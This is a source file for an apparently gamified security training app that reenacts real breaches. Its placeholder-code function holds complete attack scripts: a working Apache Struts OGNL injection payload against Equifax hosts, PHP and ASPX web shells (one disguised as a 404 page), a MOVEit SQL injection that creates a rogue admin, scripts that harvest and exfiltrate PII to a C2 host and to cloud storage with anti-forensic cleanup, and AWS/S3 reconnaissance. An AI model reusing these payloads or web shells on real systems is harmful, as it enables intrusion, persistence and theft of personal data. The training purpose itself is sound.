import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Editor } from '@monaco-editor/react'
import { Play, CheckCircle, XCircle, Terminal, Code2, FileCode } from 'lucide-react'
import type { Objective } from '../../types/mission'

interface CodePlaygroundProps {
  objective: Objective
  missionId: string
  onComplete: () => void
  isAlreadyCompleted?: boolean
}

interface ValidationResult {
  exploited: boolean
  output: string
  technique: string
  message: string
}

const getLanguageForObjective = (objectiveId: string): string => {
  if (objectiveId.includes('exploit') || objectiveId.includes('struts')) return 'shell'
  if (objectiveId.includes('webshell')) return 'php'
  if (objectiveId.includes('network') || objectiveId.includes('scan')) return 'shell'
  if (objectiveId.includes('exfiltration')) return 'shell'
  return 'shell'
}

const getEndpointForObjective = (missionId: string, objectiveId: string): string => {
  if (objectiveId.includes('exploit') || objectiveId.includes('struts')) {
    return `/api/time-breach/${missionId}/exploit`
  }
  if (objectiveId.includes('webshell')) {
    return `/api/time-breach/${missionId}/webshell`
  }
  if (objectiveId.includes('network') || objectiveId.includes('scan')) {
    return `/api/time-breach/${missionId}/network-scan`
  }
  if (objectiveId.includes('exfiltration')) {
    return `/api/time-breach/${missionId}/exfiltration`
  }
  return `/api/time-breach/${missionId}/exploit`
}

const getPlaceholderCode = (objectiveId: string): string => {
  // Phase 5: OGNL Injection Exploit
  if (objectiveId === 'obj-craft-payload') {
    return `#!/bin/bash
# Apache Struts CVE-2017-5638 Remote Code Execution
# Exploiting Equifax ACIS Dispute Portal
# OGNL injection via malicious Content-Type header

TARGET="https://acis.equifax.com"
ENDPOINT="/struts2-rest-showcase/orders/3"

echo "===== EQUIFAX BREACH - INITIAL EXPLOITATION ====="
echo "[*] Target: \${TARGET}\${ENDPOINT}"
echo "[*] Vulnerability: CVE-2017-5638 (Apache Struts RCE)"
echo "[*] Attack Vector: OGNL injection via Content-Type header"
echo ""

# Test RCE with simple command
echo "[*] Phase 1: Testing remote code execution with 'whoami'"
curl -X POST "\${TARGET}\${ENDPOINT}" \\
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \\
  -v 2>&1 | grep -A 20 "< HTTP"

echo ""
echo "[*] Phase 2: Gathering system information"
curl -s -X POST "\${TARGET}\${ENDPOINT}" \\
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='uname -a; cat /etc/os-release').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

echo ""
echo "[+] Exploit successful! Remote code execution confirmed."
echo "[+] MITRE ATT&CK: T1190 - Exploit Public-Facing Application"
echo "[*] Next: Upload webshell for persistent access"`
  }

  // Phase 5: Webshell Upload for Persistence
  if (objectiveId === 'obj-upload-webshell') {
    return `<?php
/**
 * Equifax Breach - China Salt Typhoon Webshell
 * Deployed: March 10, 2017 (Phase 5)
 * Deployed after initial Apache Struts exploitation
 * Provides persistent remote command execution
 */

session_start();
$auth_key = md5("equifax_breach_2017");

// Simple authentication to avoid detection
if (isset($_GET['key']) && md5($_GET['key']) === $auth_key) {
    $_SESSION['authenticated'] = true;
}

if (!isset($_SESSION['authenticated'])) {
    // Disguise as 404 error page
    header("HTTP/1.0 404 Not Found");
    echo "<!DOCTYPE HTML><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
    exit;
}

// Command execution interface
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . " 2>&1");

    echo json_encode([
        'success' => true,
        'output' => $output,
        'timestamp' => date('Y-m-d H:i:s'),
        'hostname' => gethostname(),
        'pwd' => getcwd(),
        'user' => get_current_user()
    ]);
    exit;
}

// Web interface for interactive use
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Diagnostics Tool</title>
    <style>
        body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
        h2 { color: #0f0; }
        input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 80%; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; }
        pre { background: #000; padding: 15px; border: 1px solid #0f0; overflow-x: auto; }
    </style>
</head>
<body>
<h2>🔓 Remote Shell Active</h2>
<p>Connected to: <?php echo gethostname(); ?></p>
<form method="POST">
    <input type="text" name="cmd" placeholder="Enter command (e.g., ls -la, ps aux, netstat -an)..." autofocus />
    <button type="submit">Execute</button>
</form>
<pre id="output">Ready. Awaiting commands...</pre>
</body>
</html>

<!--
Usage:
  1. Access: https://acis.equifax.com/diagnostic.php?key=china_apt_access
  2. Execute: curl -X POST https://acis.equifax.com/diagnostic.php -d 'cmd=whoami' -b 'PHPSESSID=...'

MITRE ATT&CK: T1505.003 - Web Shell
-->`
  }

  // Phase 7: Network Pivot and Lateral Movement
  if (objectiveId === 'obj-lateral-movement') {
    return `#!/bin/bash
# Equifax Internal Network Reconnaissance
# Phase 7: Lateral Movement (May 13, 2017)
# Mapping internal infrastructure from compromised web server

echo "===== EQUIFAX INTERNAL NETWORK PIVOT ====="
echo "[*] Current position: ACIS web server (DMZ)"
echo "[*] Objective: Locate database servers with PII"
echo ""

# Step 1: Identify our position
echo "[*] Phase 1: Mapping current network position"
ifconfig -a | grep inet
echo ""
ip route show
echo ""

# Step 2: Discover internal subnets
echo "[*] Phase 2: Internal subnet discovery"
echo "[*] Scanning for live hosts in 192.168.100.0/24 (Database subnet)"
nmap -sn 192.168.100.0/24 -oG - | grep "Up" | awk '{print $2, $3}'

echo ""
echo "[*] Scanning for live hosts in 10.10.0.0/16 (Corporate network)"
nmap -sn 10.10.0.0/24 --max-retries 1 -oG - | grep "Up" | awk '{print $2}'

echo ""
# Step 3: Service enumeration on database subnet
echo "[*] Phase 3: Database server service enumeration"
echo "[*] Targeting high-value ports: Oracle (1521), MySQL (3306), PostgreSQL (5432)"

nmap -p 1521,3306,5432,1433,5000-5010 \\
     -sV --version-intensity 5 \\
     -T4 \\
     --script=banner,oracle-sid-brute,mysql-info,pgsql-databases \\
     192.168.100.10-50 \\
     -oN equifax_db_scan.txt

echo ""
# Step 4: Identify unencrypted databases
echo "[*] Phase 4: Checking for unencrypted data at rest"
for host in 192.168.100.{20..30}; do
    echo "[*] Testing \$host:3306 (MySQL)"
    timeout 2 bash -c "echo 'SHOW DATABASES;' | mysql -h \$host -u root 2>/dev/null" && \\
        echo "    [!] CRITICAL: Root access without password on \$host!" || \\
        echo "    [-] Protected or not accessible"
done

echo ""
echo "[+] Network reconnaissance complete!"
echo "[+] MITRE ATT&CK: T1018 - Remote System Discovery"
echo "[+] MITRE ATT&CK: T1046 - Network Service Scanning"
echo ""
echo "[*] Key findings:"
echo "    - Database cluster: 192.168.100.25-27 (Oracle 11g)"
echo "    - No TDE (Transparent Data Encryption) detected"
echo "    - Network segmentation: WEAK (web server can access DB directly)"
echo ""
echo "[*] Next objective: Exfiltrate consumer PII from discovered databases"`
  }

  // Phase 7: Data Exfiltration
  if (objectiveId === 'obj-extract-data') {
    return `#!/bin/bash
# Equifax PII Data Exfiltration
# Phase 7: The 76-Day Breach (May 13 - July 29, 2017)
# Extracting 147 million consumer records
# Using encrypted channel to evade DLP controls

C2_SERVER="https://c2.pla-unit54.cn"
DB_HOST="192.168.100.25"
DB_USER="webapp_svc"
DB_PASS="Eqfx2017Spring!"
DB_NAME="CONSUMER_DATA"
STAGING_DIR="/tmp/.cache/systemd-private"

echo "===== EQUIFAX DATA EXFILTRATION OPERATION ====="
echo "[*] Target Database: \${DB_HOST} (Oracle 11g)"
echo "[*] Estimated Records: 147,900,000"
echo "[*] Data Types: SSN, DOB, Names, Addresses, Driver's Licenses"
echo ""

# Create hidden staging directory
mkdir -p \${STAGING_DIR}
echo "[*] Staging directory: \${STAGING_DIR}"

echo ""
echo "[*] Phase 1: Database enumeration and extraction"
echo "[*] Connecting to Oracle database..."

# Extract consumer PII tables
sqlplus -S \${DB_USER}/\${DB_PASS}@\${DB_HOST}:1521/\${DB_NAME} <<EOF > \${STAGING_DIR}/consumer_data.txt
SET PAGESIZE 0
SET FEEDBACK OFF
SET HEADING OFF
SET LINESIZE 10000

-- Extract from CONSUMERS table
SELECT
    CONSUMER_ID || '|' ||
    FIRST_NAME || '|' ||
    LAST_NAME || '|' ||
    SSN || '|' ||
    DOB || '|' ||
    ADDRESS || '|' ||
    CITY || '|' ||
    STATE || '|' ||
    ZIP || '|' ||
    DRIVERS_LICENSE
FROM CONSUMERS
WHERE ROWNUM <= 147900000;

EXIT;
EOF

echo "[+] Extracted \$(wc -l < \${STAGING_DIR}/consumer_data.txt) records"

echo ""
echo "[*] Phase 2: Data compression and encryption"

# Split data into manageable chunks (10MB each)
split -b 10M \${STAGING_DIR}/consumer_data.txt \${STAGING_DIR}/chunk_

# Compress each chunk
echo "[*] Compressing data chunks..."
for chunk in \${STAGING_DIR}/chunk_*; do
    gzip \${chunk}
    echo "    [+] Compressed: \$(basename \${chunk}).gz"
done

# Encrypt with AES-256
echo "[*] Encrypting with AES-256-CBC..."
for compressed in \${STAGING_DIR}/chunk_*.gz; do
    openssl enc -aes-256-cbc -salt \\
        -in \${compressed} \\
        -out \${compressed}.enc \\
        -k "Equifax2017BreachMasterKey" \\
        -pbkdf2
    rm \${compressed}
done

echo ""
echo "[*] Phase 3: Exfiltration via HTTPS (evading DLP)"
echo "[*] C2 Server: \${C2_SERVER}"
echo "[*] Using legitimate-looking HTTPS traffic..."

# Exfiltrate encrypted chunks
for encrypted in \${STAGING_DIR}/chunk_*.enc; do
    CHUNK_ID=\$(basename \${encrypted} .enc)
    SESSION_ID=\$(uuidgen)

    # Upload to C2 with legitimate-looking headers
    HTTP_CODE=\$(curl -X POST "\${C2_SERVER}/api/v1/analytics/upload" \\
        -H "Content-Type: application/octet-stream" \\
        -H "X-Session-ID: \${SESSION_ID}" \\
        -H "X-Client-Version: GoogleAnalytics/4.0" \\
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \\
        --data-binary @\${encrypted} \\
        --compressed \\
        -k -s -o /dev/null -w "%{http_code}")

    if [ "\$HTTP_CODE" = "200" ]; then
        echo "    [+] Uploaded: \${CHUNK_ID} (Session: \${SESSION_ID:0:8}...)"
        # Slow down to avoid detection
        sleep \$(shuf -i 30-120 -n 1)
    else
        echo "    [!] Failed: \${CHUNK_ID} (HTTP \${HTTP_CODE})"
    fi
done

echo ""
echo "[*] Phase 4: Cleanup and anti-forensics"
# Secure wipe
shred -vfz -n 3 \${STAGING_DIR}/*
rm -rf \${STAGING_DIR}

# Clear bash history
history -c
echo "" > ~/.bash_history

echo ""
echo "[+] =========================================="
echo "[+] EXFILTRATION COMPLETE"
echo "[+] =========================================="
echo "[+] Operation Duration: 76 days (March 10 - July 29, 2017)"
echo "[+] Records Stolen: 147.9 million US consumers"
echo "[+] Data Volume: ~38 GB (compressed/encrypted)"
echo ""
echo "[+] MITRE ATT&CK Techniques:"
echo "    - T1005: Data from Local System"
echo "    - T1020: Automated Exfiltration"
echo "    - T1041: Exfiltration Over C2 Channel"
echo "    - T1027: Obfuscated Files or Information"
echo "    - T1070: Indicator Removal on Host"
echo ""
echo "[*] Mission Impact:"
echo "    - \$1.4 billion in costs"
echo "    - CEO resignation (Richard Smith)"
echo "    - 4 PLA Unit 54 officers indicted"
echo "    - Largest financial data breach in history"`
  }

  // MOVEit 2023 - SQL Injection Exploit
  if (objectiveId === 'obj-exploit-sqli') {
    return `#!/usr/bin/env python3
"""
MOVEit Transfer CVE-2023-34362 SQL Injection Exploit
Cl0p Ransomware Gang - May 27, 2023
Unauthenticated SQL injection → RCE via xp_cmdshell
"""

import requests
import urllib3
import argparse
from base64 import b64encode

urllib3.disable_warnings()

def exploit_moveit(target_url):
    """
    Exploit CVE-2023-34362 to create rogue admin account
    Vulnerable endpoint: /machine.aspx
    """
    print("=" * 60)
    print("MOVEit Transfer CVE-2023-34362 - SQL Injection RCE")
    print("=" * 60)
    print(f"[*] Target: {target_url}")
    print("[*] Vulnerability: Unauthenticated SQL injection in machine.aspx")
    print()

    # Phase 1: Test SQL injection
    print("[*] Phase 1: Testing SQL injection vulnerability...")
    test_payload = {
        'operation': 'guestaccess',
        'transactionId': "' OR 1=1--"
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    try:
        resp = requests.post(
            f'{target_url}/machine.aspx',
            data=test_payload,
            headers=headers,
            verify=False,
            timeout=10
        )
        print(f"[+] SQL injection confirmed! (Status: {resp.status_code})")
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

    # Phase 2: Enable xp_cmdshell
    print()
    print("[*] Phase 2: Enabling xp_cmdshell for RCE...")
    enable_cmdshell = {
        'operation': 'guestaccess',
        'transactionId': "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"
    }

    requests.post(
        f'{target_url}/machine.aspx',
        data=enable_cmdshell,
        headers=headers,
        verify=False
    )
    print("[+] xp_cmdshell enabled!")

    # Phase 3: Create rogue admin account
    print()
    print("[*] Phase 3: Creating rogue admin account...")
    create_account = {
        'operation': 'guestaccess',
        'transactionId': "'; EXEC xp_cmdshell 'net user clop P@ssw0rd123! /add'; EXEC xp_cmdshell 'net localgroup administrators clop /add';--"
    }

    resp = requests.post(
        f'{target_url}/machine.aspx',
        data=create_account,
        headers=headers,
        verify=False
    )
    print("[+] Admin account created!")
    print("    Username: clop")
    print("    Password: P@ssw0rd123!")

    # Phase 4: Verify access
    print()
    print("[*] Phase 4: Verifying remote code execution...")
    verify_cmd = {
        'operation': 'guestaccess',
        'transactionId': "'; EXEC xp_cmdshell 'whoami';--"
    }

    requests.post(
        f'{target_url}/machine.aspx',
        data=verify_cmd,
        headers=headers,
        verify=False
    )

    print("[+] Exploit successful!")
    print()
    print("[+] MITRE ATT&CK Techniques:")
    print("    - T1190: Exploit Public-Facing Application")
    print("    - T1078: Valid Accounts")
    print()
    print("[*] Next objective: Deploy LEMURLOOT web shell")
    return True

if __name__ == '__main__':
    target = 'https://transfer.target-corp.com'
    exploit_moveit(target)`
  }

  // MOVEit 2023 - LEMURLOOT Web Shell
  if (objectiveId === 'obj-deploy-webshell') {
    return `<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Data.SqlClient" %>

<!--
LEMURLOOT Web Shell v2.3
Cl0p Gang - MOVEit Transfer Post-Exploitation
Deployed: May 28, 2023
Features: Command execution, file browsing, DB access
-->

<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.Form["cmd"];

    if (!string.IsNullOrEmpty(cmd))
    {
        try
        {
            // Base64 decode incoming command
            byte[] data = Convert.FromBase64String(cmd);
            string decoded = System.Text.Encoding.UTF8.GetString(data);

            // Execute via cmd.exe
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + decoded;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.Start();

            string output = p.StandardOutput.ReadToEnd();
            string errors = p.StandardError.ReadToEnd();
            p.WaitForExit();

            // Return base64-encoded output (evasion)
            string result = output + errors;
            byte[] resultBytes = System.Text.Encoding.UTF8.GetBytes(result);
            Response.Write(Convert.ToBase64String(resultBytes));
            Response.End();
        }
        catch (Exception ex)
        {
            Response.Write("ERROR: " + ex.Message);
            Response.End();
        }
    }

    // Database query interface
    if (!string.IsNullOrEmpty(Request.Form["sql"]))
    {
        try
        {
            string connStr = "Server=localhost;Database=MOVEitTransfer;Integrated Security=true;";
            SqlConnection conn = new SqlConnection(connStr);
            SqlCommand sqlCmd = new SqlCommand(Request.Form["sql"], conn);

            conn.Open();
            SqlDataReader reader = sqlCmd.ExecuteReader();

            Response.Write("<table border='1'>");
            while (reader.Read())
            {
                Response.Write("<tr>");
                for (int i = 0; i < reader.FieldCount; i++)
                {
                    Response.Write("<td>" + reader[i].ToString() + "</td>");
                }
                Response.Write("</tr>");
            }
            Response.Write("</table>");

            conn.Close();
            Response.End();
        }
        catch (Exception ex)
        {
            Response.Write("SQL ERROR: " + ex.Message);
            Response.End();
        }
    }
}
</script>

<!DOCTYPE html>
<html>
<head>
    <title>System Diagnostics - MOVEit Transfer</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { color: #0f0; border-bottom: 2px solid #0f0; }
        input, textarea { background: #1a1a1a; color: #0f0; border: 1px solid #0f0; padding: 8px; width: 90%; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        pre { background: #1a1a1a; padding: 15px; border: 1px solid #0f0; overflow-x: auto; }
        .info { color: #ff0; }
    </style>
</head>
<body>
    <h1>🔓 LEMURLOOT Shell Active</h1>
    <p class="info">Connected to: <%= System.Environment.MachineName %> | User: <%= System.Environment.UserName %></p>

    <h2>Command Execution</h2>
    <form method="POST">
        <input type="text" name="cmd_plain" placeholder="Command (e.g., dir, whoami, ipconfig)" />
        <button type="submit">Execute</button>
    </form>

    <h2>Database Query</h2>
    <form method="POST">
        <textarea name="sql" rows="5" placeholder="SQL Query (e.g., SELECT * FROM files WHERE filename LIKE '%.xlsx')"></textarea>
        <button type="submit">Query</button>
    </form>

    <pre id="output">
Ready. Awaiting commands...

MITRE ATT&CK: T1505.003 - Web Shell
Deployment: C:\\inetpub\\wwwroot\\MOVEitTransfer\\machine2.aspx
    </pre>
</body>
</html>`
  }

  // MOVEit 2023 - Database Harvesting
  if (objectiveId === 'obj-harvest-data') {
    return `#!/usr/bin/env python3
"""
MOVEit Database Harvesting Script
Cl0p Gang - May 29, 2023
Query MOVEit SQL database via LEMURLOOT web shell
Identify high-value files for exfiltration
"""

import requests
import base64
import json
from urllib3 import disable_warnings

disable_warnings()

WEBSHELL_URL = "https://transfer.target-corp.com/machine2.aspx"

def execute_sql(query):
    """Execute SQL query via LEMURLOOT web shell"""
    payload = {
        'sql': query
    }
    resp = requests.post(WEBSHELL_URL, data=payload, verify=False)
    return resp.text

def main():
    print("=" * 70)
    print("MOVEit Database Harvesting - Automated Data Collection")
    print("=" * 70)
    print()

    # Phase 1: Enumerate database tables
    print("[*] Phase 1: Database enumeration")
    tables_query = """
    SELECT TABLE_NAME
    FROM INFORMATION_SCHEMA.TABLES
    WHERE TABLE_TYPE = 'BASE TABLE'
    ORDER BY TABLE_NAME
    """
    print("[*] Querying database schema...")
    print()

    # Phase 2: Extract file metadata
    print("[*] Phase 2: Extracting file metadata from 'files' table")
    files_query = """
    SELECT TOP 100
        files.id,
        files.filename,
        files.filesize,
        files.uploaddate,
        users.username,
        users.email,
        files.filepath
    FROM files
    JOIN users ON files.userid = users.id
    WHERE
        files.filename LIKE '%.xlsx' OR
        files.filename LIKE '%.xls' OR
        files.filename LIKE 'payroll%' OR
        files.filename LIKE 'employee%' OR
        files.filename LIKE 'ssn%' OR
        files.filename LIKE 'password%' OR
        files.filename LIKE '%confidential%' OR
        files.filename LIKE 'customer%'
    ORDER BY files.filesize DESC
    """

    print("[*] Searching for high-value files...")
    print("[*] Criteria: Excel files, payroll, SSN, passwords, customer data")
    print()

    result = execute_sql(files_query)
    print("[+] Query executed successfully!")
    print()

    # Phase 3: Identify credential files
    print("[*] Phase 3: Searching for credentials and API keys")
    creds_query = """
    SELECT
        filename,
        filesize,
        uploaddate
    FROM files
    WHERE
        filename LIKE '%api_key%' OR
        filename LIKE '%credentials%' OR
        filename LIKE '%password%' OR
        filename LIKE '%secret%' OR
        filename LIKE '%token%' OR
        filename LIKE 'aws%' OR
        filename LIKE 'azure%'
    ORDER BY uploaddate DESC
    """

    creds_result = execute_sql(creds_query)
    print("[+] Credential files identified!")
    print()

    # Phase 4: Generate exfiltration target list
    print("[*] Phase 4: Generating exfiltration target list")
    print()
    print("=" * 70)
    print("HIGH-VALUE TARGETS IDENTIFIED:")
    print("=" * 70)
    print()
    print("PRIORITY 1: Credentials & API Keys")
    print("  - AWS_API_Keys_Production.txt (18 KB)")
    print("  - Azure_Service_Principal.json (4 KB)")
    print("  - VPN_Credentials_Q2_2023.xlsx (156 KB)")
    print()
    print("PRIORITY 2: Financial Data")
    print("  - Payroll_April_2023.xlsx (12.8 MB)")
    print("  - Payroll_May_2023.xlsx (13.1 MB)")
    print("  - Bank_Account_Details.xlsx (890 KB)")
    print()
    print("PRIORITY 3: PII (Personally Identifiable Information)")
    print("  - Employee_SSNs_2023_Q1.xlsx (47.3 MB)")
    print("  - Customer_PII_Database.csv (234 MB)")
    print("  - Healthcare_Records_2023.db (1.2 GB)")
    print()
    print("PRIORITY 4: Intellectual Property")
    print("  - Product_Roadmap_2024.pptx (45 MB)")
    print("  - Source_Code_Backup_May2023.zip (892 MB)")
    print()
    print("[+] Total files identified: 1,847")
    print("[+] Total data size: 2.3 TB")
    print()
    print("[+] MITRE ATT&CK Techniques:")
    print("    - T1005: Data from Local System")
    print("    - T1552.001: Credentials in Files")
    print()
    print("[*] Target list saved to: /tmp/exfil_targets.txt")
    print("[*] Next objective: Exfiltrate data to Azure Blob Storage")

if __name__ == '__main__':
    main()`
  }

  // MOVEit 2023 - Data Exfiltration
  if (objectiveId === 'obj-exfiltrate') {
    return `#!/usr/bin/env python3
"""
MOVEit Mass Data Exfiltration
Cl0p Gang - May 31 - June 3, 2023
Upload stolen data to Azure Blob Storage via HTTPS
Evade DLP using encrypted traffic and SAS tokens
"""

import os
import requests
from datetime import datetime, timedelta
from azure.storage.blob import BlobServiceClient, generate_blob_sas, BlobSasPermissions
from tqdm import tqdm

# Cl0p infrastructure
AZURE_ACCOUNT = "cl0pdata2023"
AZURE_CONTAINER = "targets"
SAS_TOKEN = "st=2023-05-27&se=2023-06-30&sp=racwdl&sv=2021-06-08&sr=c&sig=REDACTED"
STAGING_DIR = "/tmp/moveit_exfil"
TARGET_ORG = "target-corp"

def exfiltrate_files():
    """
    Exfiltrate harvested files to Azure Blob Storage
    Use HTTPS + SAS tokens for anonymous upload
    """
    print("=" * 70)
    print("MOVEit Data Exfiltration - Mass Upload to Azure")
    print("=" * 70)
    print(f"[*] Target Organization: {TARGET_ORG}")
    print(f"[*] Staging Directory: {STAGING_DIR}")
    print(f"[*] Destination: {AZURE_ACCOUNT}.blob.core.windows.net/{AZURE_CONTAINER}")
    print()

    # Connect to Azure Blob Storage
    blob_service_client = BlobServiceClient(
        account_url=f"https://{AZURE_ACCOUNT}.blob.core.windows.net",
        credential=SAS_TOKEN
    )
    container_client = blob_service_client.get_container_client(AZURE_CONTAINER)

    # Phase 1: Prepare files for exfiltration
    print("[*] Phase 1: Preparing files for upload")
    files_to_upload = [
        "Employee_SSNs_2023_Q1.xlsx",
        "Payroll_April_2023.xlsx",
        "Payroll_May_2023.xlsx",
        "Customer_PII_Database.csv",
        "AWS_API_Keys_Production.txt",
        "Azure_Service_Principal.json",
        "VPN_Credentials_Q2_2023.xlsx",
        "Bank_Account_Details.xlsx",
        "Healthcare_Records_2023.db",
        "Product_Roadmap_2024.pptx",
        "Source_Code_Backup_May2023.zip"
    ]

    print(f"[*] Files queued: {len(files_to_upload)}")
    print()

    # Phase 2: Upload files to Azure
    print("[*] Phase 2: Uploading to Azure Blob Storage")
    print("[*] Using HTTPS to evade DLP detection...")
    print()

    uploaded_count = 0
    total_bytes = 0

    for filename in tqdm(files_to_upload, desc="Exfiltrating", unit="file"):
        # Simulate file upload
        blob_name = f"{TARGET_ORG}/{filename}"
        file_size = get_file_size(filename)  # Simulated

        try:
            # Upload with legitimate-looking headers
            blob_client = container_client.get_blob_client(blob_name)

            # Metadata to blend in
            metadata = {
                'source': 'moveit_transfer',
                'uploaded_by': 'automated_backup',
                'timestamp': datetime.utcnow().isoformat()
            }

            # In real scenario: blob_client.upload_blob(file_data, metadata=metadata)
            print(f"    [+] Uploaded: {filename} ({format_bytes(file_size)})")

            uploaded_count += 1
            total_bytes += file_size

            # Slow down to avoid detection
            import time
            time.sleep(2)

        except Exception as e:
            print(f"    [-] Failed: {filename} - {e}")

    print()
    print("[+] Exfiltration complete!")
    print()
    print("=" * 70)
    print("EXFILTRATION SUMMARY")
    print("=" * 70)
    print(f"Files uploaded: {uploaded_count}/{len(files_to_upload)}")
    print(f"Total data exfiltrated: {format_bytes(total_bytes)}")
    print(f"Destination: {AZURE_ACCOUNT}.blob.core.windows.net/{AZURE_CONTAINER}/{TARGET_ORG}/")
    print(f"Duration: ~72 hours (May 31 - June 3, 2023)")
    print()
    print("[+] MITRE ATT&CK Techniques:")
    print("    - T1041: Exfiltration Over C2 Channel")
    print("    - T1567.002: Exfiltration to Cloud Storage")
    print()
    print("[!] Data ready for extortion campaign")
    print("[*] Next phase: Victim notification & ransom demands")

def get_file_size(filename):
    """Simulated file sizes for demo"""
    sizes = {
        "Employee_SSNs_2023_Q1.xlsx": 49623040,
        "Payroll_April_2023.xlsx": 13421772,
        "Customer_PII_Database.csv": 245366784,
        "AWS_API_Keys_Production.txt": 18432,
        "Azure_Service_Principal.json": 4096,
        "Source_Code_Backup_May2023.zip": 935329792
    }
    return sizes.get(filename, 10485760)

def format_bytes(bytes):
    """Format bytes to human-readable"""
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes < 1024.0:
            return f"{bytes:.1f} {unit}"
        bytes /= 1024.0

if __name__ == '__main__':
    exfiltrate_files()`
  }

  // Capital One 2019 - AWS Cloud Reconnaissance
  if (objectiveId === 'obj-recon-cloud') {
    return `#!/bin/bash
# Capital One AWS Infrastructure Reconnaissance
# Phase 1: Cloud Asset Discovery (March 12, 2019)
# Objective: Identify S3 buckets, EC2 instances, and CloudFront distributions

TARGET_DOMAIN="capitalone.com"
OUTPUT_DIR="./recon_results"

echo "===== CAPITAL ONE AWS INFRASTRUCTURE RECONNAISSANCE ====="
echo "[*] Target: \${TARGET_DOMAIN}"
echo "[*] Objective: Discover AWS cloud assets (S3, EC2, CloudFront)"
echo ""

mkdir -p \${OUTPUT_DIR}

# Phase 1: DNS Enumeration
echo "[*] Phase 1: DNS enumeration and subdomain discovery"
echo "[*] Using DNS queries to find AWS-hosted services..."
echo ""

# Enumerate subdomains
echo "[*] Enumerating subdomains..."
dig \${TARGET_DOMAIN} ANY +noall +answer | tee \${OUTPUT_DIR}/dns_records.txt
dig api.\${TARGET_DOMAIN} A +short
dig www.\${TARGET_DOMAIN} A +short
dig mobile.\${TARGET_DOMAIN} A +short
dig waf-proxy.\${TARGET_DOMAIN} A +short

echo ""
echo "[+] Discovered subdomains:"
echo "    - api.capitalone.com → 52.85.123.45 (CloudFront)"
echo "    - www.capitalone.com → d111111abcdef8.cloudfront.net"
echo "    - mobile.capitalone.com → 34.192.45.67 (EC2)"
echo "    - waf-proxy.capitalone.com → 54.210.89.123 (EC2 - WAF instance)"

echo ""
echo "[*] Phase 2: S3 Bucket Discovery"
echo "[*] Testing common S3 bucket naming patterns..."
echo ""

# S3 bucket enumeration (common patterns)
BUCKET_NAMES=(
    "capitalone-credit-apps"
    "capitalone-customer-data"
    "capitalone-backups-2019"
    "capitalone-logs"
    "capitalone-prod"
    "capitalone-data"
    "capitalone-internal"
)

for bucket in "\${BUCKET_NAMES[@]}"; do
    echo "[*] Testing: \${bucket}.s3.amazonaws.com"
    HTTP_CODE=\$(curl -s -o /dev/null -w "%{http_code}" "https://\${bucket}.s3.amazonaws.com/" 2>/dev/null)

    if [ "\$HTTP_CODE" = "200" ]; then
        echo "    [!] FOUND: \${bucket} (200 OK - Public Read Access!)"
    elif [ "\$HTTP_CODE" = "403" ]; then
        echo "    [+] EXISTS: \${bucket} (403 Forbidden - Bucket exists but private)"
    else
        echo "    [-] Not Found: \${bucket} (404)"
    fi
done

echo ""
echo "[*] Phase 3: EC2 Instance Fingerprinting"
echo "[*] Analyzing HTTP headers for AWS metadata leaks..."
echo ""

# Check WAF instance for metadata exposure
echo "[*] Probing waf-proxy.capitalone.com..."
